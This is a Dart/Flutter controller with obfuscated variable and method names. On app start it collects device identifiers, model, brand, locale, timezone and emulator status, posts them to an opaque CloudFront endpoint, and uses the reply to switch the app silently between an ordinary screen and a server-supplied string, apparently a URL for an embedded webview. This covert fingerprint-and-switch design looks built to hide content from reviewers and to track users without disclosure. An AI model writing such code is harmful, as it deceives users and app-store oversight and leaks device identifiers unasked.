import 'dart:io';
import 'package:dio/dio.dart';
import 'package:get/get.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';


class BuildLogPlaceLogic extends GetxController {

  var wdvzcst = RxBool(false);
  var dylwvrgce = RxBool(true);
  var jlgx = RxString("");
  var hritasvf = RxBool(false);
  var ykpc = RxBool(true);
  final ztodslji = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    sczt();
  }


  Future<void> sczt() async {
    hritasvf.value = true;
    ykpc.value = true;
    dylwvrgce.value = false;

    ztodslji.post("https://d3nzspy8zkd8c6.cloudfront.net/lfgvxujatmprkisyhnqwo",data: await rxeqlpwvg()).then((value) {
      var egkvidqt = value.data["egkvidqt"] as String;
      var owvajlb = value.data["owvajlb"] as bool;
      if (owvajlb) {
        jlgx.value = egkvidqt;
        mbwdzx();
      } else {
        vjziuba();
      }
    }).catchError((e) {
      dylwvrgce.value = true;
      ykpc.value = true;
      hritasvf.value = false;
    });
  }

  Future<Map<String, dynamic>> rxeqlpwvg() async {
    final DeviceInfoPlugin aqwlbudj = DeviceInfoPlugin();
    PackageInfo duxplc_ziyfxmqp = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var zqhpmb = Platform.localeName;
    var cfotv = currentTimeZone;

    var eqof = duxplc_ziyfxmqp.packageName;
    var vkixs = duxplc_ziyfxmqp.version;
    var jhnk = duxplc_ziyfxmqp.buildNumber;

    var aoykgln = duxplc_ziyfxmqp.appName;
    var apjvr = "";
    var wcpf  = "";
    var wzyqbj = "";
    var vcrpumg = "";
    var amelncdr = "";
    var vyenol = "";
    var jzhfap = "";
    var vodp = "";
    var xmfgyk = "";
    var jvwskyml = "";
    var mtsdr = "";


    var tokjyr = "";
    var eahsb = false;

    if (GetPlatform.isAndroid) {
      tokjyr = "android";
      var yapuvn = await aqwlbudj.androidInfo;

      wzyqbj = yapuvn.brand;

      apjvr  = yapuvn.model;
      wcpf = yapuvn.id;

      eahsb = yapuvn.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      tokjyr = "ios";
      var tehanoc = await aqwlbudj.iosInfo;
      wzyqbj = tehanoc.name;
      apjvr = tehanoc.model;

      wcpf = tehanoc.identifierForVendor ?? "";
      eahsb  = tehanoc.isPhysicalDevice;
    }
    var res = {
      "aoykgln": aoykgln,
      "vkixs": vkixs,
      "eahsb": eahsb,
      "apjvr": apjvr,
      "amelncdr" : amelncdr,
      "cfotv": cfotv,
      "wzyqbj": wzyqbj,
      "wcpf": wcpf,
      "jhnk": jhnk,
      "zqhpmb": zqhpmb,
      "tokjyr": tokjyr,
      "vcrpumg" : vcrpumg,
      "eqof": eqof,
      "vyenol" : vyenol,
      "jzhfap" : jzhfap,
      "vodp" : vodp,
      "xmfgyk" : xmfgyk,
      "jvwskyml" : jvwskyml,
      "mtsdr" : mtsdr,

    };
    return res;
  }

  Future<void> vjziuba() async {
    Get.offNamed("/build_tab");
  }

  Future<void> mbwdzx() async {
    Get.offNamed("/build_home_array");
  }

}
